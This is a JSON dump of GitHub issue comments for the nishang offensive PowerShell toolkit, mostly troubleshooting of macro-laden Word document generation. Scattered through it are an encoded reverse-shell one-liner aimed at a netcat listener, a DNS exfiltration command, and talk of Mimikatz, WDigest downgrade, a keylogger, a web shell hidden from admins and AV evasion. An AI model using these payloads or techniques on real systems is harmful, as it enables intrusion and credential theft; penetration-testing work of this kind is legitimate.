{
    "samratashok": "Thanks for the contribution. I would merge this with some modifications. The Interent Explorer COM object would be used only if it could not be done using the .net libraries. This is to avoid the extensive monitoring of IE by AV products and IE Enhanced Security Mitigation.\n. Done. \n. Fixed in commit \nhttps://github.com/samratashok/nishang/commit/c74bb1e020be93769f20a2ed5f3e5375bda54f4c\n. Fixed with this commit: \nhttps://github.com/samratashok/nishang/commit/9abdbb78eedb7f0a9be9e610b2ca263d29e996c5\nVersion 0.3.8.1\n. I have been unable to reproduce this on Windows 7 and Office 2007. More feedback awaited from the original reporter.\n. Fixed. Out-Word and Out-Excel now works with latest version of Ms Office (checked on trial Office 2013 professional)\n. Closed with merger of pull request #8 from the user LogoiLab. Thank you. \n. Great! Thanks. \n. Fixed by commit #100\nhttps://github.com/samratashok/nishang/commit/2065f9a6b50316e8cc6ff3d0282c997d719ee72e\n. Fixed in commit https://github.com/samratashok/nishang/commit/82d87a79d11be1b12fff42d3c53c219f4b6149de\n. Not required for CHANGELOG.\n. Thanks for pointing this out. It has been done for both. \n. Interesting suggestion! What if I implement authentication in place of this? Wouldn't that be better/easier to use?\n. Noted! I would try and see what could be done. Authentication would be implemented as well.\n. Some changes to Antak have been made. Will commit the changes after an upcoming preso at Blackhat.\n. Authentication is required to access Antak. That is all to be added for now. \n. Fixed with commit https://github.com/samratashok/nishang/commit/0fd6327e067196b130225d94e9a94b70c347a388\n. While the bug fix works for me, the original reporter still have problems.\n. Tested on multiple machines (Windows 7 and Server 2012 R2 with different patches). No bug fix required. \n. The issue was reported by an anonymous user by this comment:\nhttp://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html?showComment=1435835570056#c2007721560700630955\nOther issues by the user would be raised once reproduced.\n. Thanks for reporting. Trying to reproduce the bug.\n. Can 't replicate the bug. What is the PowerShell version you are using?\n. Closing it as there has been no response from the user.\n. Thanks. I will add one.\n. Let me try to reproduce it.\n. Unable to reproduce. Tried on a Windows 7 with PowerShell v2 and Office 2013. Try running the script from a PowerShell prompt. I think the problem is the way you are using the script.\n\n. You don't seem to be doing anything wrong but I am still unable to reproduce. Try:\n1. Running from normal (non-administrative) PowerShell prompt.\n2. What is the output of this on your test machine?:  (New-Object -ComObject Word.Application).Version\n   Since you are running Office 2013, you should see 15.0 as output. \n3. Please share the output of $PSVersionTable in PowerShell. I just want to make sure if there is dependency on .Net version which I am unaware of.\n. $Word = New-Object -ComObject Word.Application\n$Word.DisplayAlerts = \"wdAlertsNone\"\nDo you receive an error? \nTry \n$Word.DisplayAlerts = $False\n. I am using VMware. Tried the code on home and enterprise editions of Windows 7m it works fine for me. Try replacing this code in the script:\n    if (($WordVersion -eq \"12.0\") -or  ($WordVersion -eq \"11.0\"))\n    {\n        $Word.DisplayAlerts = $False\n    }\n    else\n    {\n        $Word.DisplayAlerts = \"wdAlertsNone\"\n    } \nwith this code\n$Word.DisplayAlerts = $False\nThough above may not be the right way but see if it works.\n. Did you get a chance to test the above code?\n. Find me there and get your issue resolved :)\n. Could you please update me on this?\n. Still unable to reproduce the bug :(\n. Closing due to inability to reproduce. \n. The bug could be reproduced. It is there because the function responsible for exfiltration Do-Exfiltration is present both in the backdoors and Powerpreter. Renaming the function Do-Exfiltration in the backdoors removes the problem.\n. Issue has been fixed.\n. Thanks Dillon. These are minor grammatical changes. Not merging them.\n. You are right. Currently, it can't log keys from RDP or PowerShell remoting, I may have a look at it in future.\n. I am not sure. Never ended up testing this. . Feel free to test the code and then I can merge it.. Use of accesschk.exe is a bummer :/ \nDon't remember at all that could be the reason why I never merged it. . As suggested by Peter, tsdiscon.exe is able to lock the machine. Also, the machine unlock event which starts Invoke-Mimikatz in the script is not getting triggered in case of RDP connections. Testing different approaches. For example, tried Win32_ProcessStopTrace and Win32_ProcessStartTrace for TSTheme process, but no success, yet. \n. Unable to figure out a WMI event that is triggered when a RDP session becomes active. Also, tsdiscon is not logging off a user, so WDigest downgrade doesn't work as well.\n. Turns out that the script worked fine for console logins (and is good for client side attacks as well). The support for RDP sessions has been added. \n. Apparently the Login_Click function of Antak doesn't like older .Net methods or the use of VisualBasic is making this happen. Needs more testing. Meanwhile the older version of Antak could be used (no authentication and no web.config parsing)\nhttps://github.com/samratashok/nishang/blob/ff44751d36d65ca208a8cc66f18d00c9cba35e01/Antak-WebShell/antak.aspx\n. Fixed with this commit https://github.com/samratashok/nishang/commit/3a7f0b744e39affeaa8185249b2129bca36d1699\n. Thanks! Let me test the proposed solution. \n. Tested. Thanks for the fix.\n. Thank you very much. Let me test this. \n. Merged, needs some polishing, I will do that. Thanks for the PR!\n. Thanks for the fix! Let me test this. \n. Try it with a simple payload (like Get-Process), if the same error persists, its AMSI. Though I don't think it is AMSI. I will test it tomorrow and fix this issue. \n. Closing this as no further information was provided. . Saw that. Currently, I am not merging pull requests which remove only a character from the documentation. You are welcome to make more meaningful contribution. \n. Thanks! Will see if this can be included in the next release. \n. Can you share couple of screenshots and exact commands you used? Seems to work fine here (On Windows 7 and PowerShell v3)\n\n\n. Looks like it is because of Office 2016. See this issue https://github.com/samratashok/nishang/issues/34\nI will test this over the weekend.\n. It works fine on Office 2013 on Windows 10 for me. Is it similar environment as yours?\n\n. Are you using office 2013? I mean, which version of MS Office are you using?\n. Unable to reproduce the error :/\n. It detects many scrips in Nishang (read the Antivirus section in README) but AFAIK, Out-Word is not detected yet. Does the below code give you an error? \n$Word = New-Object -ComObject Word.Application\n$Word.DisplayAlerts = \"wdAlertsNone\"\n. And the below one gives an error as well?\n$Word = New-Object -ComObject Word.Application\n$Word.DisplayAlerts = $False\n. Strange! Another thing, what is the output of below code?\n$Word = New-Object -ComObject Word.Application\n$Word.Version\n. Which is right for Office 2013. What is causing the error completely escapes me right now.\n. This shows an error as well?\n$Word = New-Object -ComObject Word.Application\n$Word.DisplayAlerts = [Microsoft.Office.InterOp.Word.WdAlertLevel]::wdAlertsNone]::wdAlertsNone\n. My bad, there was a typo. Try this:\n$Word = New-Object -ComObject Word.Application\n$Word.DisplayAlerts = [Microsoft.Office.InterOp.Word.WdAlertLevel]::wdAlertsNone\n. Just spun a new instance of Windows 10 with Office 2013. Worked on it as well. I would suggest to try on another machine.\n. No problem. Please keep me posted!\n. Just added a simple line to add verbosity to DNS_TXT_Pwnage. Run the above command with -Verbose parameter to check for errors. My guess, pastebin's spam detection is blocking your pastes or you have reached the free account limit for private pastes.\nFor gmail, you need to enable \"Allow access to insecure apps\" in gmail account settings before you can use it. \n. Great! Thanks a ton! I will update the script.\n. Looks good! Thanks a lot! Let me test it a bit.\n. Thanks! Testing the patch,\n. Thanks a ton for the fix.\n. Thanks! Tested and Merged. \n. Just tested and it looks fine. Just to be sure, can you move the AuthNS parameter to the end of the command:\nDNS_TXT_Pwnage -StartDomain start.abc.com -cmdstring begincommands -CommandDomain command.abc.com -psstring startscript -PSDomain script.abc.com -Arguments Get-WLAN-Keys -Subdomains 3 -StopString stop -exfil -ExfilOption DNS -DomainName abc.com -AuthNS ns1.abc.com\n. Did you try moving the AuthNS parameter to the end? \n. What is the output of \"nslookup -querytype=txt 5ZsHuBsf0prP3BtsEZxasMFfk42K14uw+JdZ4feCBeN2PLlmiVkyeTAWK1iUKsk.abc.com\" ?\n. Closing. No response received. Assuming fixed. . Thanks. Merging this. Will make some changes. \n. You need to load the script using dot sourcing. \nPS C:\\Users\\Admin\\Documents\\WindowsPowerShell\\Modules\\nishang\\Utility>.  .\\ExetoText.ps1\nPS C:\\Users\\Admin\\Documents\\WindowsPowerShell\\Modules\\nishang\\Utility> ExetoText C:\\Users\\Admin\\Documents\\WindowsPowerShell\\Modules\\nishang\\Utility\\crss.exe C:\\Users\\Admin\\Documents\\WindowsPowerShell\\Modules\\nishang\\Utility\\crss.txt. Closing. No response received. . Do you have MS Word installed on the machine where you are running the Out-Word script?. Does Out-Excel throws a similar error?\n. That is a trick to entice a user to enable Macros. The payload gets executed. Have a look at running processes you will see an additional powershell.exe process.. Hi, sorry for the late reply. Let me test the issue. . Fixed with https://github.com/manasmbellani/nishang/commit/1d1ac9806566f8c6c0c1b806446321899253c0bd. Thanks! Testing it.. Hi, \nNever seen this before. Can't reproduce as well :/. Don't know if its a question or a you are trying to raise an issue/bug but the code works fine for me. You need not use Invoke-Expression here as you are already running the code in a PowerShell console. . You can use \"powershell -ep bypass\" to set execution policy to bypass for the new PowerShell process.. Thanks for reporting!. Works fine even with the backticks. Trying to reproduce. . Updated the script to remove the backticks in commit https://github.com/samratashok/nishang/commit/f616c1d7e7651b1b4ca576d5d493eb80cb3bdab8. Need couple of examples to understand the issue before I try anything.  . Update please?. Need more details. What do you mean by push? Does it execute the payload twice?\nP.S. I am no God :). The payload is executed just once by default. But if yo click on the first and third help topics in the generated CHM, the payload gets executed on each click. . Don't know why you are facing this. Could you please share the code?. Please share a gist or paste the code here. . calc pops up just once for me :/. Sure. I simply saved your code and used it. Calc pops just once.\n\n. Any update on this? Else I would like to close the issue. . Yes, I believe it needs to be reported to the Kali team. . Please use double quotes to enclose the script block as the script block contains single quotes. \nInvoke-Encode -DataToEncode \"\" -IsString -PostScriptCommand. Uh sorry, I answered in a hurry. Using double quotes with Invoke-Encode evaluates the variables. Please use single quotes and escape those in the payload. \n\nPlease keep in mind that it is always better to point Invoke-Encode to a script (save your payload in a script) to avoid escaping quotes manually. . What do you see when you open the Word document? You have to click through Protected View and Macro warning. \nYou may like to remove the screenshot with the Public IP? Just in case. . This should work fine then. It could also be your AV. \nAlso, try the payload without Word document to see if it works. You may also like to try if you can establish TCP traffic between the target and listener. If not, try payloads which use other protocols. . Simply use the payload you are passing to Out-Word in cmd\nC:> powershell \n. What was the issue with the Word doc previously? Could be the same on other hosts as well. . Closed due to no response. . The newline is because of Out-String. As PowerShellv2 (or even v5) does not support a -NoNewLine parameter, I can't see of any easy way to fix it without increasing the length of the reverse shell. . For the error part, this script does not send error on the network stream. You cannot see the complete message because of this. You may like to use Invoke-PowerShellTcp to resolve this problem.. Which Windows version? Which PowerShell version?. Never tested this on Server 2008. From your error it looks like there some type conversion issues. Can't commit that I will do this but please give me some time to test this. . Thanks! Let me test that!. Testing in progress - Needs AD Module. That would be great!. I think it would be better to use System.DirectoryServices and other .Net classes so as to reduce the dependency. If that cannot be done, than use #require and the script can still be merged.. I meant #require check for ActiveDirectory module.. I am getting an error 'The Server is unwilling to process the request' on line 104 (New-ADUser). Trying to check the reason. \nAlso, Is that $SPN supposed to be $ServicePrincipalName. \nI really like the idea of the backdoor. . Merged! Will rename this and do some changes. Thanks for the contribution :). Tested! Merging! Will add an example. . ",
    "noncetonic": "Authentication would be nice as well, I was just thinking that it'd be nice to first check for the existence of the POST variable to keep snooping admins from thinking there is anything at the requested location unless they actually view the file on the server itself.\n. ",
    "gregkcarson": "Failed again after upgrading to PowerShell v3.\nRunning Windows 7 Professional SP 1 64bit.\nOffice 2013\nTried PowerShell v2 and v3\nTried running CMD prompt as admin and non-admin.\nFrom the nishang-master\\client directory I executed:\n1.  . .\\Out-Word.ps1\n-followed by\n2. Out-Word -Payload \"powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process\"\n. After the error it says the file is saved but the prompt hangs and no file appears.\n\n. My method:\n- Download ZIP from github page\n- Place in C:\\Users\\gcarson directory\n- Extract contents\n- Open a command prompt as administrator\n- type PS to load powershell\n- CD to nishang-master\\client\\ directory\n  Copy paste in:\n- . .\\Out-Word.ps1\n  -followed by\n- Out-Word -Payload \"powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process\"\n. Output for Question 2: 15.0\nOutput for Question 3:\nPS Version 3.0\nWSManStackVersion 3.0\nSerializationVersion 1.1.0.1\nCLRVersion 4.0.30319.18444\nBuildVersion 6.2.9200.16398\nPSRemotingProtocolVersion 2.2\n. I will try this on Monday and let you know - was out of office today.\nI'm going to try installing everything on a different machine over the weekend and see if I can get better results. Will let you know.\n. Here's the result : \n\n. Also can you let me know what virtualization software you are using? If you are just using trial windows 7 image and trial office in virtualbox and it works without issue then perhaps I will do the same and copy the file back to my system.\n. Not yet - just finishing up a couple projects and packing for Black Hat. Should be able to test it when I get back from DEFCON on the 10th :)\n. I replaced those lines as you mentioned previously and ran the command. The command finished without error but it did not produce a \"saved to file C:\\path\\path\\etc\" message. I checked in the install directory and I do not see any file created anywhere.\n. ",
    "PHPPlay": "I tested，Without success\n. ",
    "Lexus89": "Bump - Is this ever going to be merged?. Shame, such priv-esc scripts could be a great addition to the toolkit. I've taken a quick look but seems it could use an upgrade before merge to maintain code quality of nishang:\n\nhardcoded path (D:..)\nuse of third party tool (accesschk.exe)\nno additional parameters (e.g. output is really big no filter to display vuln only). \n",
    "nmonkee": "Line  179  contains this:\n$Word.DisplayAlerts = $False\nOutside of the version check loop when modifying an existing doc. \nPerhaps the issue?\n. Fixing that, you then get another error...\nArgument: '2' should be a System.Management.Automation.PSReference. Use [ref].\nAt C:\\Out-Word.ps1:292 char:17\n-                 $Doc.Saveas([ref]$SavePath, 0)\n-                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n  - CategoryInfo          : NotSpecified: (:) [], MethodException\n  - FullyQualifiedErrorId : NonRefArgumentToRefParameterMsg\n. This seems to make it all play nice:\n$SaveFormat = “microsoft.office.interop.word.WdSaveFormat” -as [type]\n            $Doc.Saveas([ref]$SavePath, [ref]$SaveFormat::wdFormatDocumentDefault)\n. Probably want [ref]0 or the Macro doesn't get embedded.\n. ",
    "hardrock1234": "It works like charm on windows 7 with office 2013 -  or maybe it's to do with AMSI  ? \nRegards, \n. Cool, trying now and keep you posted, \nRegards \n. Thank you for your quick response - so then its on 64 windows 10   Version 5.0.10586.122\n\n. Thanks for this, here is my ps environment - still same issue here \n\n. Correct - i use office 2013  on windows 10 , \nRegards, \n. Actually i think i found out what it is,  \"Windows defender windows 10\"  the ultimate culprit \nWhen copied from github & extracted on to a disk it flags it right away  \nRegards, \nsza \n. Aha i seem to fail to read the readme file, yeah that's right it gives me the same error as above ?\n. No above does not produce any error \n. The output is 15.0 \nRegards,\n. \n. \n. Ok - thank you very much for your consistent help and effort :) \n. ",
    "0xcrypto": ":laughing: It actually corrected a typo in README.md \n. lol... will try to do so later...\n. ",
    "cloudwafs": "Great! . ",
    "Cat0x00": "Ping ;]\n. ",
    "totoroha": "can anyone help me with this? i want to test it in our environment to see if we can detect it but i stucked right there.\n. so in that case, what did you do for the nameservers that made this work. cause in my case, i don't use zoneedit.com as the domain service and hosting service too.\n. I did.\nOn Sunday, October 9, 2016, samratashok notifications@github.com wrote:\n\nDid you try moving the AuthNS parameter to the end?\n—\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/samratashok/nishang/issues/46#issuecomment-252498047,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AG_RjCRw8vazc55E5yaa725Oojaoj1ncks5qyR0SgaJpZM4KPTAP\n.\n. \n",
    "Indeserpen": "yes thanks all good now!!. ",
    "srihari-humbarwadi": "\n. Yes I have office 13. Reinstalling MS office solved the part. but when i open the word file nothing happens.\nso i tried putting single quote  then this happened \nPS C:\\Users\\eMO\\desktop> out-word -Payload \" powershell.exe -noexit -c Invoke-Expression $(New-Object IO.StreamReader ($\n(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(''c08t0Q0oyk9OLS7\nm5QIA'')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"\nAt line:1 char:201\n+ ... Base64String(''c08t0Q0oyk9OLS7m5QIA'')))), [IO.Compression.CompressionMode]::Dec ...\n+                    ~\nMissing ')' in method call.\nAt line:1 char:201\n+ ... Base64String(''c08t0Q0oyk9OLS7m5QIA'')))), [IO.Compression.CompressionMode]::Dec ...\n+                    ~~~~~~~~~~~~~~~~~~~~~~\nUnexpected token 'c08t0Q0oyk9OLS7m5QIA''' in expression or statement.\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\n    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall\n. Reinstalling MS office solved the part. but when i open the word file nothing happens.\nso i tried putting single quote then this happened\nPS C:\\Users\\eMO\\desktop> out-word -Payload \" powershell.exe -noexit -c Invoke-Expression $(New-object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(''c08t0Q0oyk9OLS7m5QIA'')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"\nerror in the pic\n. \n. \nMicrosoft Word 2010\nThis document was edited in a different version of Microsoft Word.\nTo load the document, please Enable Content\nthis is what i get when i dont include single quotes . my script which is 400 lines, when i try to encode it with invoke-encode it give me the same result for for \n-outcommand and -postscriptcommand\n. ./invoke-encoded.ps1\ninvoke-encode -DataToEncode main.ps1 -Outcommand\nwhen i run this i get Output as PostScriptCommand\nPS : Generated PostScriptCommand is valid.  but i am not able to get the right form of output\nInteresting thing is, small scripts work fine  . \n. ",
    "cfalta": "Hi,\nthanks for looking into it. From what I can tell so far, the problem seems to be the powerdump code that gets the encrypted hashes from the SAM.\nAt line 321 start two checks to verify the LM/NTLM header in the registry (-eq 20) and these checks never succed in Windows 10. I guess they changed something in the layout and therefore the hashes aren't located at the same offsets anymore.\nDo you know if there's some kind of documentation on this?\nThanks again, best regards\nChristoph\n. ",
    "Ub3rKristy": "@samratashok thank you! . ",
    "Dliv3": "I have tested in Win7(Powershell Version 2) and Win10(Powersell Version 5)\nWin10：\n```\nPS C:\\Users\\test\\Desktop> $PSVersionTable\nName                           Value\n----                           -----\nPSVersion                      5.1.15063.0\nPSEdition                      Desktop\nPSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}\nBuildVersion                   10.0.15063.0\nCLRVersion                     4.0.30319.42000\nWSManStackVersion              3.0\nPSRemotingProtocolVersion      2.3\nSerializationVersion           1.1.0.1\n```\nWin7:\n```\nPS C:\\Users\\test\\Desktop\\powershell\\nishang\\Gather> $PSVersionTable\nName                           Value\n----                           -----\nCLRVersion                     2.0.50727.5485\nBuildVersion                   6.1.7601.17514\nPSVersion                      2.0\nWSManStackVersion              2.0\nPSCompatibleVersions           {1.0, 2.0}\nSerializationVersion           1.1.0.1\nPSRemotingProtocolVersion      2.1\n```. Need me to fix this bug and submit a new Pull Request ?. Do you think it is a good idea to solve this problem with https://github.com/samratashok/ADModule when Get-Module ActiveDirectory failed ?. I tried to write code using System.DirectoryServices, but I didn't succeed because I didn't find out how to manipulate the service account and unrestricted delegation through System.DirectoryServices. In addition, the #require check for the AD module has been added.\n. Oh sorry, it is my mistake. $SPN should indeed be $ServicePrincipalName. . Under what circumstances will cause 'The Server is unwilling to process the request' error? I did not get this error when testing on win7 win10 win2008R2 win2012R2. . Any progress？. ",
    "ghost": "Exactly what you say the payload exe twice\nI notice the “x.click()” may be the key but I just don’t know why it leads the payload exed mtwice when I open the chm\nThanks for reply  \n发送自 Windows 10 版邮件应用\n发件人: samratashok\n发送时间: 2017年12月7日 17:28\n收件人: samratashok/nishang\n抄送: ilovejiang; Author\n主题: Re: [samratashok/nishang] Why when trying Out-CHM,it will exe twiceevery operation? (#60)\nNeed more details. What do you mean by push? Does it execute the payload twice?\nP.S. I am no God :)\n—\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub, or mute the thread.\n. i didn't use a payload in your .ps , but i rewrite your ps_code , put the calc.exe linkage into the JS code to replace the \"$payload\" para.\nthen , i just double cilck the chm file ,when it opens , calc.exe will pop twice, even if i didn't do anything else.\nAnd i also test the ori file , the cmd.exe will pop twice too.\n. Sorry for replying late . \nShould i email the code to you ? May you could give me some help.\nThanks. Here is the link!\nhttps://gist.github.com/ilovejiang/3ea8d9590f96f7759c0deffb4c85c90b\nThanks. （‘’—。—‘’）well,could you please tell me your steps when retrying this? for you open powershell as the start........ ",
    "jackd91": "Thanks - can you let me know by the below isn't working? Can't get my head around why its not connecting back to my netcat listener.\n. Thanks for your help. Still unable to get it working though even when using single quotes:\nAre there any other methods that I could use to create a Word document that'll callback to my netcat listener as this doesn't seem to be working?\nThanks.\n. I do click through the Protected View and Macro warning and just see:\nMicrosoft Word 2016\nThis document was edited in a different version of Microsoft Word.\nTo load the document, please Enable Content. I have tried doing this on multiple hosts (some without AV) and it just doesn't seem to be working :(. Surely I must be doing something wrong? How do I go about testing the payload without the Word doc?. I have a netcat listening on port 4444 and when I run the below on the target machine it doesn't appear to be working. Just seems to be hanging. Any ideas?\nC:> powershell Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('TZFda8IwFIbvB/sP56JbE2ZD203ZLBO2sg1hqKzCLsSL2B5sZq1iz1BR//uS1nbmJofwfjxJrDhTmBM8wwC3znD2gzFBtC8Il2KAJKJVvEAqxDgchaWS2d6TL7zOo/CE5/p260EvHlgFbVAudY5VJYoPpKg8YzyYzPaEk+nUMnuhRa4QnXb7vn28ObinYJuqDBmzlLFXQeILZcIqfQvcFlSj+MR8Tinn4OQILj8EViJJah+74HfG+zUO5BLrm4xxR+IlCvv9tzxeJSqf8zOfHusWU6LMTTBPZjJemFCFO6ga/N6tB0cY/pJT2eBC6kNJXhvvwB5FYOudrbcJFyNJqTnsgX326EITPyEDhmemabdbMpZsr4aJ/Tc0Tyy+N4qQNTmau5nr52m079lvkTJ+CupfCbNVgYxfX/0B')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();. Edit - I have now got it working with just testing the payload. Now I need to try to get it working with the Word doc too.. Just a small update - I have finally got the payload to work within the Word document. However, it only appears to be working when I open the Word document on a single host - the others don't seem to work? Any ideas?. ",
    "nlykkei": "Thank you - but, ls | out-string in PowerShelll gives the expected output without newlines in-between lines.\nIndeed, out-string adds a trailing newline to the overall output. However, in the output from the reverse shell, a newline is inserted between every pair of successive lines?. ",
    "robantonucci": "\nFor the error part, this script does not send error on the network stream. You cannot see the complete message because of this. You may like to use Invoke-PowerShellTcp to resolve this problem.\n\nI found a fix for this, Im getting errors back in the network stream. Change line 76 to: $result = (Invoke-Expression -Command $response) 2>&1 | Out-String. ",
    "githubtran": "Windows Server 2008 R2 with Powershell v2.0. Thank you.  It could be the Powershell version.  Let's me see if I can upgrade to Powershell v4 and test again.. Upgrade to Powershell v4 fixed the error.  Thanks.. "
}